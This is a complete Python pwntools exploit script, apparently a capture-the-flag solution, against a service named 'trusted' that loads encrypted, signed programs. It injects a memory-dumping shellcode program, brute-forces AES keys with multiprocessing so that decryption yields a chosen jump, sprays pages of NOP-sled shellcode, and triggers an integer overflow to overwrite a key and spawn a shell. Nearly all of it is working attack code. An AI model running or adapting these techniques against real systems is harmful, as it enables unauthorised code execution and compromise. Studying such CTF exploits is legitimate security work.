#!/usr/bin/env python3

from pwn import *
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES
from tqdm import trange
from multiprocessing import Pool, cpu_count
import os

exe = None

context.arch = "amd64"
# context.log_level = "debug"

gdbscript = """
"""

HOST = args.HOST if args.HOST else "localhost"
PORT = int(args.PORT) if args.PORT else 1337
SSL = args.SSL


def conn():
    if args.LOCAL:
        context.binary = exe = ELF("trusted")
        r = process([exe.path])
    elif args.GDB:
        context.binary = exe = ELF("trusted")
        r = gdb.debug([exe.path], gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT, ssl=SSL)
        if args.TOKEN:
            r.sendlineafter(b"token: ", args.TOKEN.encode())

    return r


DUMPER_PROG = """
mov eax, 0
mov edi, 7
lea rsi, [rsp]
mov rdx, 0x400
syscall
xchg eax, edx
mov eax, 1
mov edi, 1
syscall
mov eax, 0x3c
xor edi, edi
syscall
"""


def add_dec_prog(prog_b64):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"> ", prog_b64)


def add_enc_prog(prog_b64, key_idx):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"> ", prog_b64)
    r.sendlineafter(b"> ", str(key_idx).encode())


def add_key(key_b64):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"> ", key_b64)


def dec_verif_program(idx):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"> ", str(idx).encode())

    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"> ", b"3")


def run_program(idx, ret_status=True, flag=False):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"> ", str(idx).encode())

    ret_back = bytes([r.recvuntil(b") Go back", drop=True)[-1]])
    res = None

    r.sendlineafter(b"> ", b"1")
    if ret_status:
        res = r.recvuntil(b"Program executed successfully with status", drop=True)

    if not flag:
        r.sendlineafter(b"> ", ret_back)

    return res


def dump_proginfo(idx) -> tuple[bytes, int]:
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"> ", str(idx).encode())
    r.recvuntil(b"Load Address: ")
    load_addr = int(r.recvline().strip().decode(), 16)
    r.recvuntil(b"Status: ")
    r.recvline()

    if b"IV" in (iv_line := r.recvline()):
        iv = bytes.fromhex(iv_line.strip().split(b": ")[1].strip().decode())
        r.sendlineafter(b"> ", b"3")
    else:
        iv = None
        r.sendlineafter(b"> ", b"2")

    return iv, load_addr


def main():
    global r
    r = conn()

    dmp_prog = b64e(p32(1) + asm(DUMPER_PROG)).encode()
    add_dec_prog(dmp_prog)
    ENC_SIG_PROG = run_program(3)

    encsig_iv, _ = dump_proginfo(2)

    log.info(f"IV: {encsig_iv.hex()}")

    r.close() # We can brute offline

    # Could be cached as both the program and iv are constant through the runs
    res = brute(2**24, ENC_SIG_PROG, encsig_iv) 

    if len(res) == 0: # unlikely
        log.failure("Brute force failed")
        return

    r = conn()
    add_key(b64e(b"\x00" * 32).encode()) # dummy key to load our spray programs

    _, encsig_load_addr = dump_proginfo(2) # we need the addr to know where the jump takes us

    curr_ld = 2

    # exactly 1 page, accounting for the padding: NOP SLED + SHELLCODE + PAD
    shellcode = asm(shellcraft.sh())
    page_content = shellcode.rjust(0x1000 - 0x10, b"\x90")

    enc = AES.new(b"\x00" * 32, AES.MODE_CBC, iv=b"\x00" * 16).encrypt(
        pad(page_content, 16)
    )

    goodkey = None

    for _ in range(512):
        add_enc_prog(b64e(p32(3) + b"\x00" * 16 + b"\x00" * 64 + enc).encode(), 2) # add spray program with dummy key
        curr_ld += 1
        dec_verif_program(curr_ld)
        run_program(curr_ld, False) # make sure it gets set as executable

        _, load_addr = dump_proginfo(curr_ld)

        log.info(f"Loaded page at: {hex(load_addr)}")

        for jmp in res.keys():

            target = encsig_load_addr + jmp + 5
            if (0xfff >= target & 0xFFF > (0x1000 - len(shellcode) - 0x10)): # if the jump takes us in the middle of shellcode/padding, it will likely crash
                continue

            if check_addr_in_page(load_addr, target):
                log.info(f"Found target page: {hex(load_addr)}, idx = {curr_ld}, target addr = {hex(target)}")
                goodkey = res[jmp]

        if goodkey != None:
            break

    for _ in trange(256, desc="Overwriting key for signed program"): # trigger the int overflow to overwrite the sigenc program's decryption key
        add_key(b64e(goodkey).encode())

    dec_verif_program(2)
    run_program(2, False, True)

    r.interactive()


def check_addr_in_page(page_addr, target):
    return page_addr <= target < page_addr + 0x1000


def brute_worker(args):
    ciphertext, IV, N = args
    local_results = {}

    for _ in trange(N):
        key = os.urandom(32)
        cipher = AES.new(key, AES.MODE_CBC, IV, use_aesni=True)

        dec = cipher.decrypt(ciphertext[:16])

        if dec[0] == 0xE9 and dec[4] == 0xFF:
            local_results[u32(dec[1:5], signed=True)] = key

    return local_results


def brute(N: int, ciphertext: bytes, IV: bytes) -> dict[bytes, int]:
    num_cores = cpu_count()
    chunk_size = N // num_cores

    log.info(f"Using {num_cores} processes for brute force")

    work_chunks = [(ciphertext, IV, chunk_size) for _ in range(num_cores)]

    with Pool(processes=num_cores) as pool:
        log.info("Starting multiprocess brute force...")
        results = pool.map(brute_worker, work_chunks)

    OUT = {}
    total_found = 0
    for result_dict in results:
        OUT.update(result_dict)
        if result_dict:
            total_found += len(result_dict)

    if total_found > 0:
        log.info(f"Found {total_found} total results across all processes")

    return OUT


if __name__ == "__main__":
    main()
